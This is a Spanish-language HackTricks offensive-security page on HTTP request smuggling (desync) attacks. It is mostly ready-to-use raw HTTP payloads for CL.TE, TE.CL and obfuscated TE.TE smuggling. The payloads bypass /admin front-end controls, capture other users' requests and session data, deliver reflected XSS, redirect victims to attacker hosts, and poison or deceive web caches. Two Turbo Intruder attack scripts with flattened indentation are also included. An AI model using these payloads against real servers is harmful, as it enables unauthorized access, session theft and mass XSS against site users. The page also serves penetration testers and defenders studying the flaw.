# Ataque de Desincronización de Petición HTTP / Ataque de Desincronización HTTP

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Qué es

Esta vulnerabilidad ocurre cuando una **desincronización** entre los **proxies de front-end** y el **servidor de back-end** permite a un **atacante** enviar una **petición HTTP** que será **interpretada** como una **única petición** por los **proxies de front-end** (balanceador de carga/proxy inverso) y **como 2 peticiones** por el **servidor de back-end**.\
Esto permite a un usuario **modificar la siguiente petición que llega al servidor de back-end después de la suya**.

### Teoría

[Especificación RFC (2161)](https://tools.ietf.org/html/rfc2616)

> Si se recibe un mensaje con un campo de encabezado Transfer-Encoding y un campo de encabezado Content-Length, este último DEBE ser ignorado.

**Content-Length**

> El encabezado de entidad Content-Length indica el tamaño del cuerpo de la entidad, en bytes, enviado al destinatario.

**Transfer-Encoding: chunked**

> El encabezado Transfer-Encoding especifica la forma de codificación utilizada para transferir de manera segura el cuerpo de carga útil al usuario.\
> Chunked significa que los datos grandes se envían en una serie de fragmentos.

### Realidad

El **Front-End** (un balanceador de carga / Proxy Inverso) **procesa** el encabezado _**content-length**_ o el _**transfer-encoding**_ y el **servidor de Back-End** **procesa el otro** provocando una **desincronización** entre los 2 sistemas.\
Esto podría ser muy crítico ya que **un atacante podrá enviar una petición** al proxy inverso que será **interpretada** por el **servidor de back-end como 2 peticiones diferentes**. El **peligro** de esta técnica radica en el hecho de que el **servidor de back-end interpretará la 2da petición inyectada** como si **hubiera venido del siguiente cliente** y la **petición real** de ese cliente será **parte** de la **petición inyectada**.

### Particularidades

Recuerda que en HTTP **un carácter de nueva línea está compuesto por 2 bytes:**

* **Content-Length**: Este encabezado utiliza un **número decimal** para indicar el **número** de **bytes** del **cuerpo** de la petición. Se espera que el cuerpo termine en el último carácter, **no se necesita una nueva línea al final de la petición**.
* **Transfer-Encoding:** Este encabezado utiliza en el **cuerpo** un **número hexadecimal** para indicar el **número** de **bytes** del **próximo fragmento**. El **fragmento** debe **terminar** con una **nueva línea** pero esta nueva línea **no se cuenta** en el indicador de longitud. Este método de transferencia debe terminar con un **fragmento de tamaño 0 seguido de 2 nuevas líneas**: `0`
* **Connection**: Basado en mi experiencia, se recomienda usar **`Connection: keep-alive`** en la primera petición del ataque de Smuggling de petición.

## Ejemplos Básicos

Los ataques de desincronización de petición HTTP se crean enviando peticiones ambiguas que explotan discrepancias en cómo los servidores de front-end y back-end interpretan los encabezados `Content-Length` (CL) y `Transfer-Encoding` (TE). Estos ataques pueden manifestarse en diferentes formas, principalmente como **CL.TE**, **TE.CL**, y **TE.TE**. Cada tipo representa una combinación única de cómo los servidores de front-end y back-end priorizan estos encabezados. Las vulnerabilidades surgen de los servidores procesando la misma petición de diferentes maneras, lo que lleva a resultados inesperados y potencialmente maliciosos.

### Ejemplos Básicos de Tipos de Vulnerabilidad

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### Vulnerabilidad CL.TE (Content-Length usado por Front-End, Transfer-Encoding usado por Back-End)
- **Front-End (CL):** Procesa la petición basándose en el encabezado `Content-Length`.
- **Back-End (TE):** Procesa la petición basándose en el encabezado `Transfer-Encoding`.
- **Escenario de Ataque:**
- El atacante envía una petición donde el valor del encabezado `Content-Length` no coincide con la longitud real del contenido.
- El servidor de front-end reenvía toda la petición al back-end, basándose en el valor de `Content-Length`.
- El servidor de back-end procesa la petición como fragmentada debido al encabezado `Transfer-Encoding: chunked`, interpretando los datos restantes como una petición separada y subsiguiente.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Vulnerabilidad TE.CL (Transfer-Encoding usado por Front-End, Content-Length usado por Back-End)
- **Front-End (TE):** Procesa la petición basándose en el encabezado `Transfer-Encoding`.
- **Back-End (CL):** Procesa la petición basándose en el encabezado `Content-Length`.
- **Escenario de Ataque:**
- El atacante envía una petición fragmentada donde el tamaño del fragmento (`7b`) y la longitud real del contenido (`Content-Length: 4`) no coinciden.
- El servidor de front-end, respetando `Transfer-Encoding`, reenvía toda la petición al back-end.
- El servidor de back-end, respetando `Content-Length`, procesa solo la parte inicial de la petición (`7b` bytes), dejando el resto como parte de una petición subsiguiente no intencionada.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### Vulnerabilidad TE.TE (Transfer-Encoding usado por ambos, con obfuscación)
- **Servidores:** Ambos admiten `Transfer-Encoding`, pero uno puede ser engañado para ignorarlo mediante obfuscación.
- **Escenario de Ataque:**
- El atacante envía una petición con encabezados de `Transfer-Encoding` obfuscados.
- Dependiendo de qué servidor (front-end o back-end) no reconozca la obfuscación, se puede explotar una vulnerabilidad CL.TE o TE.CL.
- La parte no procesada de la petición, vista por uno de los servidores, se convierte en parte de una petición subsiguiente, lo que lleva al smuggling.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Escenario CL.CL (Content-Length usado por ambos Front-End y Back-End):**
- Ambos servidores procesan la petición basándose únicamente en el encabezado `Content-Length`.
- Este escenario típicamente no conduce al smuggling, ya que hay alineación en cómo ambos servidores interpretan la longitud de la petición.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Petición Normal
```

#### **Escenario CL != 0:**
- Se refiere a escenarios donde el encabezado `Content-Length` está presente y tiene un valor distinto de cero, indicando que el cuerpo de la petición tiene contenido.
- Es crucial para comprender y crear ataques de smuggling, ya que influye en cómo los servidores determinan el final de una petición.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Cuerpo no vacío
```

#### Forzando a través de encabezados hop-by-hop

Abusando de los encabezados hop-by-hop, podrías indicar al proxy que **elimine el encabezado Content-Length o Transfer-Encoding para que sea posible abusar de un ataque de smuggling de petición HTTP**.
```
Connection: Content-Length
```
Para **más información sobre encabezados de paso a paso**, visita:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## Encontrar HTTP Request Smuggling

Identificar vulnerabilidades de HTTP request smuggling a menudo se puede lograr utilizando técnicas de temporización, que dependen de observar cuánto tiempo tarda el servidor en responder a las solicitudes manipuladas. Estas técnicas son particularmente útiles para detectar vulnerabilidades CL.TE y TE.CL. Además de estos métodos, existen otras estrategias y herramientas que se pueden utilizar para encontrar tales vulnerabilidades:

### Encontrar Vulnerabilidades CL.TE Utilizando Técnicas de Temporización
- **Método:**
- Enviar una solicitud que, si la aplicación es vulnerable, hará que el servidor de back-end espere datos adicionales.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **Observación:**
- El servidor de front-end procesa la solicitud basándose en `Content-Length` y corta el mensaje prematuramente.
- El servidor de back-end, esperando un mensaje fragmentado, espera el siguiente fragmento que nunca llega, causando un retraso.

- **Indicadores:**
- Tiempos de espera o largos retrasos en la respuesta.
- Recibir un error 400 Bad Request del servidor de back-end, a veces con información detallada del servidor.

### Encontrar Vulnerabilidades TE.CL Utilizando Técnicas de Temporización
- **Método:**
- Enviar una solicitud que, si la aplicación es vulnerable, hará que el servidor de back-end espere datos adicionales.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **Observación:**
- El servidor de front-end procesa la solicitud basándose en `Transfer-Encoding` y reenvía el mensaje completo.
- El servidor de back-end, esperando un mensaje basado en `Content-Length`, espera datos adicionales que nunca llegan, causando un retraso.

### Otros Métodos para Encontrar Vulnerabilidades
- **Análisis Diferencial de Respuestas:**
- Enviar versiones ligeramente variadas de una solicitud y observar si las respuestas del servidor difieren de manera inesperada, lo que indica una discrepancia en el análisis.

- **Uso de Herramientas Automatizadas:**
- Herramientas como la extensión 'HTTP Request Smuggler' de Burp Suite pueden probar automáticamente estas vulnerabilidades enviando diversas formas de solicitudes ambiguas y analizando las respuestas.

- **Pruebas de Variación de Content-Length:**
- Enviar solicitudes con valores de `Content-Length` variables que no coincidan con la longitud real del contenido y observar cómo el servidor maneja tales discrepancias.

- **Pruebas de Variación de Transfer-Encoding:**
- Enviar solicitudes con encabezados de `Transfer-Encoding` obfuscados o malformados y monitorear cómo responden de manera diferente los servidores de front-end y back-end a tales manipulaciones.


### Pruebas de Vulnerabilidad de HTTP Request Smuggling

Después de confirmar la efectividad de las técnicas de temporización, es crucial verificar si las solicitudes de los clientes pueden ser manipuladas. Un método sencillo es intentar envenenar tus solicitudes, por ejemplo, haciendo que una solicitud a `/` genere una respuesta 404. Los ejemplos de `CL.TE` y `TE.CL` discutidos anteriormente en [Ejemplos Básicos](./#basic-examples) muestran cómo envenenar la solicitud de un cliente para provocar una respuesta 404, a pesar de que el cliente intenta acceder a un recurso diferente.

**Consideraciones Clave**

Al probar vulnerabilidades de request smuggling al interferir con otras solicitudes, ten en cuenta:

* **Conexiones de Red Distintas:** Las solicitudes "de ataque" y "normales" deben enviarse a través de conexiones de red separadas. Utilizar la misma conexión para ambas no valida la presencia de la vulnerabilidad.
* **URL y Parámetros Consistentes:** Intenta utilizar URLs idénticas y nombres de parámetros para ambas solicitudes. Las aplicaciones modernas a menudo dirigen las solicitudes a servidores de back-end específicos según la URL y los parámetros. Coincidir con estos aumenta la probabilidad de que ambas solicitudes sean procesadas por el mismo servidor, un requisito previo para un ataque exitoso.
* **Temporización y Condiciones de Carrera:** La solicitud "normal", destinada a detectar la interferencia de la solicitud "de ataque", compite contra otras solicitudes de la aplicación concurrentes. Por lo tanto, envía la solicitud "normal" inmediatamente después de la solicitud "de ataque". Las aplicaciones ocupadas pueden requerir múltiples pruebas para confirmar la vulnerabilidad de manera concluyente.
* **Desafíos de Balanceo de Carga:** Los servidores de front-end que actúan como balanceadores de carga pueden distribuir las solicitudes en varios sistemas de back-end. Si las solicitudes "de ataque" y "normales" terminan en sistemas diferentes, el ataque no tendrá éxito. Este aspecto del balanceo de carga puede requerir varios intentos para confirmar una vulnerabilidad.
* **Impacto no Intencionado en el Usuario:** Si tu ataque afecta inadvertidamente la solicitud de otro usuario (no la solicitud "normal" que enviaste para la detección), esto indica que tu ataque influyó en otro usuario de la aplicación. Las pruebas continuas podrían interrumpir a otros usuarios, lo que requiere un enfoque cauteloso.


## Abusando de HTTP Request Smuggling

### Para evadir controles de seguridad de front-end

### Circunvalando la Seguridad de Front-End a través de HTTP Request Smuggling

A veces, los proxies de front-end imponen medidas de seguridad, escrutando las solicitudes entrantes. Sin embargo, estas medidas pueden ser eludidas explotando HTTP Request Smuggling, permitiendo el acceso no autorizado a puntos finales restringidos. Por ejemplo, acceder a `/admin` podría estar prohibido externamente, con el proxy de front-end bloqueando activamente tales intentos. No obstante, este proxy puede omitir inspeccionar las solicitudes incrustadas dentro de una solicitud HTTP contrabandeada, dejando una brecha para eludir estas restricciones.

Considera los siguientes ejemplos que ilustran cómo HTTP Request Smuggling puede ser utilizado para evadir controles de seguridad de front-end, apuntando específicamente al camino `/admin` que típicamente está protegido por el proxy de front-end:

**Ejemplo CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
En el ataque CL.TE, se aprovecha el encabezado `Content-Length` para la solicitud inicial, mientras que la solicitud incrustada posterior utiliza el encabezado `Transfer-Encoding: chunked`. El proxy de front-end procesa la solicitud `POST` inicial pero no inspecciona la solicitud incrustada `GET /admin`, lo que permite el acceso no autorizado al camino `/admin`.

**Ejemplo TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Por el contrario, en el ataque TE.CL, la solicitud `POST` inicial utiliza `Transfer-Encoding: chunked`, y la solicitud incrustada posterior se procesa en función del encabezado `Content-Length`. Similar al ataque CL.TE, el proxy de front-end pasa por alto la solicitud `GET /admin` infiltrada, otorgando inadvertidamente acceso al camino restringido `/admin`.

### Revelando la reescritura de solicitudes de front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Las aplicaciones a menudo emplean un **servidor de front-end** para modificar las solicitudes entrantes antes de enviarlas al servidor de back-end. Una modificación típica implica agregar encabezados, como `X-Forwarded-For: <IP del cliente>`, para transmitir la IP del cliente al back-end. Comprender estas modificaciones puede ser crucial, ya que podría revelar formas de **burlar protecciones** o **descubrir información o puntos finales ocultos**.

Para investigar cómo un proxy altera una solicitud, localiza un parámetro POST que el back-end ecoea en la respuesta. Luego, crea una solicitud, utilizando este parámetro al final, similar a lo siguiente:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
En esta estructura, los componentes de la solicitud posterior se agregan después de `search=`, que es el parámetro reflejado en la respuesta. Esta reflexión expondrá los encabezados de la solicitud posterior.

Es importante alinear el encabezado `Content-Length` de la solicitud anidada con la longitud real del contenido. Comenzar con un valor pequeño e incrementar gradualmente es recomendable, ya que un valor demasiado bajo truncará los datos reflejados, mientras que un valor demasiado alto puede hacer que la solicitud genere un error.

Esta técnica también es aplicable en el contexto de una vulnerabilidad TE.CL, pero la solicitud debe terminar con `search=\r\n0`. Independientemente de los caracteres de nueva línea, los valores se agregarán al parámetro de búsqueda.

Este método sirve principalmente para comprender las modificaciones de la solicitud realizadas por el proxy de front-end, realizando esencialmente una investigación autodirigida.

### Capturando las solicitudes de otros usuarios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Es factible capturar las solicitudes del siguiente usuario agregando una solicitud específica como el valor de un parámetro durante una operación POST. Así es como se puede lograr:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
En este escenario, el **parámetro de comentario** está destinado a almacenar el contenido dentro de la sección de comentarios de una publicación en una página de acceso público. En consecuencia, el contenido de la solicitud posterior aparecerá como un comentario.

Sin embargo, esta técnica tiene limitaciones. Generalmente, captura datos solo hasta el delimitador de parámetros utilizado en la solicitud contrabandeada. Para envíos de formularios codificados en URL, este delimitador es el carácter `&`. Esto significa que el contenido capturado de la solicitud del usuario víctima se detendrá en el primer `&`, que incluso puede ser parte de la cadena de consulta.

Además, vale la pena señalar que este enfoque también es viable con una vulnerabilidad TE.CL. En tales casos, la solicitud debe concluir con `search=\r\n0`. Independientemente de los caracteres de nueva línea, los valores se agregarán al parámetro de búsqueda.

### Utilizando el contrabando de solicitudes HTTP para explotar XSS reflejado

El contrabando de solicitudes HTTP se puede aprovechar para explotar páginas web vulnerables a **XSS Reflejado**, ofreciendo ventajas significativas:

* No se requiere **interacción** con los usuarios objetivo.
* Permite la explotación de XSS en partes de la solicitud que son **normalmente inaccesibles**, como los encabezados de solicitud HTTP.

En escenarios donde un sitio web es susceptible a XSS Reflejado a través del encabezado User-Agent, la siguiente carga útil demuestra cómo explotar esta vulnerabilidad:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Este payload está estructurado para explotar la vulnerabilidad mediante:

1. Iniciar una solicitud `POST`, aparentemente típica, con un encabezado `Transfer-Encoding: chunked` para indicar el inicio del contrabando.
2. Seguir con un `0`, marcando el final del cuerpo del mensaje en bloques.
3. Luego, se introduce una solicitud `GET` contrabandeada, donde el encabezado `User-Agent` se inyecta con un script, `<script>alert(1)</script>`, desencadenando el XSS cuando el servidor procesa esta solicitud subsecuente.

Al manipular el `User-Agent` a través del contrabando, el payload evade las restricciones normales de la solicitud, explotando así la vulnerabilidad de XSS Reflejado de una manera no estándar pero efectiva.

### Usando el contrabando de solicitudes HTTP para convertir una redirección en el sitio en una redirección abierta <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Explotando Redirecciones en el Sitio con el Contrabando de Solicitudes HTTP <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Las aplicaciones a menudo redirigen de una URL a otra utilizando el nombre de host del encabezado `Host` en la URL de redirección. Esto es común en servidores web como Apache e IIS. Por ejemplo, solicitar una carpeta sin una barra diagonal al final resulta en una redirección para incluir la barra:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Resultados en:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Aunque parezca inofensivo, este comportamiento puede ser manipulado utilizando el contrabando de solicitudes HTTP para redirigir a los usuarios a un sitio externo. Por ejemplo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Esta solicitud contrabandeada podría hacer que la siguiente solicitud de usuario procesada sea redirigida a un sitio web controlado por un atacante:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Resultados en:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### Utilizando el contrabando de solicitudes HTTP para realizar envenenamiento de caché web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### Explotando el Envenenamiento de Caché Web a través del Contrabando de Solicitudes HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

El envenenamiento de caché web se puede ejecutar si algún componente de la **infraestructura del front-end almacena en caché contenido**, típicamente para mejorar el rendimiento. Al manipular la respuesta del servidor, es posible **envenenar la caché**.

Anteriormente, observamos cómo las respuestas del servidor podían ser alteradas para devolver un error 404 (consulte [Ejemplos Básicos](./#basic-examples)). De manera similar, es factible engañar al servidor para que entregue el contenido de `/index.html` en respuesta a una solicitud de `/static/include.js`. En consecuencia, el contenido de `/static/include.js` se reemplaza en la caché por el de `/index.html`, haciendo que `/static/include.js` sea inaccesible para los usuarios, lo que potencialmente podría llevar a una Denegación de Servicio (DoS).

Esta técnica se vuelve particularmente potente si se descubre una **vulnerabilidad de Redirección Abierta** o si hay una **redirección en el sitio a una redirección abierta**. Estas vulnerabilidades pueden ser explotadas para reemplazar el contenido en caché de `/static/include.js` con un script bajo el control del atacante, lo que básicamente habilita un ataque generalizado de Cross-Site Scripting (XSS) contra todos los clientes que soliciten el `/static/include.js` actualizado.

A continuación se muestra una ilustración de la explotación del **envenenamiento de caché combinado con una redirección en el sitio a una redirección abierta**. El objetivo es alterar el contenido en caché de `/static/include.js` para servir código JavaScript controlado por el atacante:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Ten en cuenta la solicitud incrustada dirigida a `/post/next?postId=3`. Esta solicitud será redirigida a `/post?postId=4`, utilizando el valor del **encabezado Host** para determinar el dominio. Al alterar el **encabezado Host**, el atacante puede redirigir la solicitud a su dominio (**redirección interna a redirección abierta**).

Después de un exitoso **envenenamiento de socket**, se debe iniciar una solicitud **GET** para `/static/include.js`. Esta solicitud será contaminada por la solicitud previa de **redirección interna a redirección abierta** y obtendrá el contenido del script controlado por el atacante.

Posteriormente, cualquier solicitud para `/static/include.js` servirá el contenido en caché del script del atacante, lanzando efectivamente un amplio ataque XSS.


### Uso del contrabando de solicitudes HTTP para realizar engaño de caché web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **¿Cuál es la diferencia entre el envenenamiento de caché web y el engaño de caché web?**
>
> * En el **envenenamiento de caché web**, el atacante hace que la aplicación almacene algún contenido malicioso en la caché, y este contenido se sirve desde la caché a otros usuarios de la aplicación.
> * En el **engaño de caché web**, el atacante hace que la aplicación almacene algún contenido sensible perteneciente a otro usuario en la caché, y luego el atacante recupera este contenido de la caché.

El atacante crea una solicitud contrabandeada que obtiene contenido sensible específico del usuario. Considera el siguiente ejemplo:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Si esta solicitud contrabandeada envenena una entrada de caché destinada para contenido estático (por ejemplo, `/someimage.png`), los datos sensibles de la víctima de `/private/messages` podrían ser almacenados en la entrada de caché del contenido estático. En consecuencia, el atacante podría potencialmente recuperar estos datos sensibles almacenados en caché.

### Armando HTTP Request Smuggling con Desincronización de Respuesta HTTP

¿Has encontrado alguna vulnerabilidad de HTTP Request Smuggling y no sabes cómo explotarla? Prueba este otro método de explotación:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts de Turbo Intruder

### CL.TE

Desde [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Desde: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Herramientas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta herramienta es un Fuzzer HTTP basado en gramática útil para encontrar discrepancias extrañas en el tráfico de solicitudes.

## Referencias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
